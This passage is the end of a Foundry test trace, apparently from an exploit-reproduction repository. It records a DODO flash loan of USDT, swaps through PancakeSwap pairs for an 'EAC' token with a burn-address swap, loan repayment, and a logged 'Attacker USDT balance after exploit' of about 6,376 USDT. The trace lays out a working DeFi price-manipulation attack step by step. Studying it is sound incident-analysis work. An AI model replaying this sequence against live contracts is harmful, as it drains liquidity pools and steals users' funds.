+    │   │   │   │   │   │   │   ├─ emit Transfer(from: 0x7C8F0F09f1605237D3A5160E78B04cCCec6D7971, to: 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA, value: 46416014582806141965 [4.641e19])
+    │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 135240120398395645696302 [1.352e23]
+    │   │   │   │   │   │   ├─ [893] 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA::getReserves() [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 10712768041855724267922478 [1.071e25], 524864735984651796231810046 [5.248e26], 1693303711 [1.693e9]
+    │   │   │   │   │   │   ├─ [952] EAC::balanceOf(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 10712814457870307074064443 [1.071e25]
+    │   │   │   │   │   │   ├─ [26745] 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA::swap(0, 2268425750783038368199 [2.268e21], 0x000000000000000000000000000000000000dEaD, 0x)
+    │   │   │   │   │   │   │   ├─ [10835] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::transfer(0x000000000000000000000000000000000000dEaD, 2268425750783038368199 [2.268e21])
+    │   │   │   │   │   │   │   │   ├─ [867] 0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7::tradeMapping(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   ├─ [867] 0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7::tradeMapping(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   ├─ [2127] 0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7::sell()
+    │   │   │   │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0xFF69f0CcDFaDD7E0353CDe9bE0b844D5b2008Cd7) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: 0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA, to: 0x000000000000000000000000000000000000dEaD, value: 2268425750783038368199 [2.268e21])
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ [952] EAC::balanceOf(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 10712814457870307074064443 [1.071e25]
+    │   │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0xa0FFe0603E1329948E4623f5E9965C6E866Fb4CA) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 524862467558901013193441847 [5.248e26]
+    │   │   │   │   │   │   │   ├─ emit Sync(reserve0: 10712814457870307074064443 [1.071e25], reserve1: 524862467558901013193441847 [5.248e26])
+    │   │   │   │   │   │   │   ├─ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 46416014582806141965 [4.641e19], amount1In: 0, amount0Out: 0, amount1Out: 2268425750783038368199 [2.268e21], to: 0x000000000000000000000000000000000000dEaD)
+    │   │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   │   ├─ [930] 0x89E75E1fCF32b8d2b6c7d3A40C5BbF8fDDb93B08::balanceOf(0x000000000000000000000000000000000000dEaD) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 137508546149178684064501 [1.375e23]
+    │   │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   │   └─ ← [Stop] 
+    │   │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, value: 2251176707266097885309 [2.251e21])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [893] 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c::getReserves() [staticcall]
+    │   │   │   │   └─ ← [Return] 454283378763169749699028 [4.542e23], 1084061343194160880084 [1.084e21], 1693303711 [1.693e9]
+    │   │   │   ├─ [952] EAC::balanceOf(0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c) [staticcall]
+    │   │   │   │   └─ ← [Return] 3335238050460258765393 [3.335e21]
+    │   │   │   ├─ [18782] 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c::swap(306376857069483687314748 [3.063e23], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
+    │   │   │   │   ├─ [3271] USDT::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 306376857069483687314748 [3.063e23])
+    │   │   │   │   │   ├─ emit Transfer(from: 0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 306376857069483687314748 [3.063e23])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 147906521693686062384280 [1.479e23]
+    │   │   │   │   ├─ [952] EAC::balanceOf(0x6901c75C9A0B18687bD6f5764fE7fdD1dbCc316c) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3335238050460258765393 [3.335e21]
+    │   │   │   │   ├─ emit Sync(reserve0: 147906521693686062384280 [1.479e23], reserve1: 3335238050460258765393 [3.335e21])
+    │   │   │   │   ├─ emit Swap(sender: PANCAKE_ROUTER_V2: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 2251176707266097885309 [2.251e21], amount0Out: 306376857069483687314748 [3.063e23], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   │   │   │   └─ ← [Stop] 
+    │   │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   │   └─ ← [Return] 306376857069483687314748 [3.063e23]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3271] USDT::transfer(DODOPool: [0x26d0c625e5F5D6de034495fbDe1F6e9377185618], 300000000000000008388608 [3e23])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: DODOPool: [0x26d0c625e5F5D6de034495fbDe1F6e9377185618], value: 300000000000000008388608 [3e23])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [531] USDT::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 6376857069483678926140 [6.376e21]
+    │   │   ├─ emit log_named_decimal_uint(key: "Attacker USDT balance after exploit", val: 6376857069483678926140 [6.376e21], decimals: 18)
+    │   │   └─ ← [Stop] 
+    │   ├─ [2531] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::balanceOf(DODOPool: [0x26d0c625e5F5D6de034495fbDe1F6e9377185618]) [staticcall]
+    │   │   └─ ← [Return] 7273686763177386758 [7.273e18]
+    │   ├─ [531] USDT::balanceOf(DODOPool: [0x26d0c625e5F5D6de034495fbDe1F6e9377185618]) [staticcall]
+    │   │   └─ ← [Return] 786495227296081906786471 [7.864e23]
+    │   ├─ [531] 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c::balanceOf(DODOPool: [0x26d0c625e5F5D6de034495fbDe1F6e9377185618]) [staticcall]
+    │   │   └─ ← [Return] 7273686763177386758 [7.273e18]
+    │   ├─ [531] USDT::balanceOf(DODOPool: [0x26d0c625e5F5D6de034495fbDe1F6e9377185618]) [staticcall]
+    │   │   └─ ← [Return] 786495227296081906786471 [7.864e23]
+    │   ├─ emit DODOFlashLoan(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 0, : 300000000000000008388608 [3e23])
+    │   └─ ← [Stop] 
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 415.60ms (11.59ms CPU time)
+
+Ran 2 test suites in 805.31ms (775.59ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
